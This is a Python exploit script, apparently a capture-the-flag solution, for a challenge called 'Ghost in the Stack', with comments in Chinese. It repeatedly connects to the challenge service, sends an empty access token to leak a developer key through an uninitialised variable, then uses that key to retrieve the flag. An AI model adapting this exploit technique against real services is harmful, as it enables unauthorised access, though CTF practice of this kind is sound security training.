#!/usr/bin/env python3
import socket
import time
import re

def connect_to_server(host, port):
    """连接到远程服务器"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    return s

def recv_until(s, delimiter):
    """接收数据直到遇到分隔符"""
    data = b""
    while delimiter.encode() not in data:
        data += s.recv(1)
    return data.decode()

def exploit():
    host = "ghost-in-the-stack.chall.edgesecurity.team"
    port = 1344
    
    print("[+] 开始利用Ghost in the Stack漏洞...")
    
    # 尝试多次连接来获取开发者密钥
    for attempt in range(1, 101):  # 最多尝试100次
        print(f"[*] 尝试 #{attempt} - 利用未初始化变量获取开发者密钥...")
        
        try:
            # 连接到服务器
            s = connect_to_server(host, port)
            
            # 等待菜单
            menu = recv_until(s, "Choice:")
            print(f"[DEBUG] 收到菜单:\n{menu}")
            
            # 选择选项2 (Access premium content)
            s.send(b"2\n")
            
            # 等待premium access level提示
            prompt = recv_until(s, "Enter your premium access level:")
            print(f"[DEBUG] Premium access prompt: {prompt}")
            
            # 发送一个数字(这个参数在函数中没有被使用)
            s.send(b"1\n")
            
            # 等待access token提示
            token_prompt = recv_until(s, "Enter access token in hex (or press Enter to skip):")
            print(f"[DEBUG] Token prompt: {token_prompt}")
            
            # 直接发送回车，利用未初始化变量
            s.send(b"\n")
            
            # 等待响应
            time.sleep(0.5)
            
            try:
                s.settimeout(2)
                response = s.recv(4096).decode()
                print(f"[DEBUG] 响应: {response}")
                
                # 检查是否泄露了开发者密钥
                dev_key_match = re.search(r"Developer Mode Key: (0x[0-9A-Fa-f]+)", response)
                if dev_key_match:
                    dev_key = dev_key_match.group(1)
                    print(f"[SUCCESS] 泄露的开发者密钥: {dev_key}")
                    s.close()
                    
                    # 现在使用这个密钥来获取flag
                    return get_flag_with_key(host, port, dev_key)
                
            except socket.timeout:
                print(f"[DEBUG] 尝试 #{attempt} 超时，继续...")
            
            s.close()
            
        except Exception as e:
            print(f"[ERROR] 尝试 #{attempt} 失败: {e}")
            continue
    
    print("[-] 所有尝试都失败了，可能需要更多的尝试或调整策略")
    return False

def get_flag_with_key(host, port, dev_key):
    """使用泄露的开发者密钥获取flag"""
    print(f"[+] 使用开发者密钥 {dev_key} 获取flag...")
    
    try:
        s = connect_to_server(host, port)
        
        # 等待菜单
        menu = recv_until(s, "Choice:")
        print(f"[DEBUG] 菜单: {menu}")
        
        # 选择选项1 (View free content)
        s.send(b"1\n")
        
        # 等待subscription key提示
        sub_prompt = recv_until(s, "Enter your subscription key:")
        print(f"[DEBUG] Subscription prompt: {sub_prompt}")
        
        # 将十六进制密钥转换为十进制并发送
        dev_key_int = int(dev_key, 16)
        s.send(f"{dev_key_int}\n".encode())
        
        # 等待响应
        time.sleep(0.5)
        s.settimeout(5)
        response = s.recv(4096).decode()
        print(f"[SUCCESS] Flag响应:\n{response}")
        
        # 查找flag
        flag_match = re.search(r"(flag\{[^}]+\}|edge\{[^}]+\}|INT3\{[^}]+\})", response)
        if flag_match:
            flag = flag_match.group(1)
            print(f"[FLAG] 找到flag: {flag}")
            return flag
        else:
            print("[+] 完整响应可能包含flag:")
            print(response)
        
        s.close()
        return True
        
    except Exception as e:
        print(f"[ERROR] 获取flag失败: {e}")
        return False

if __name__ == "__main__":
    exploit()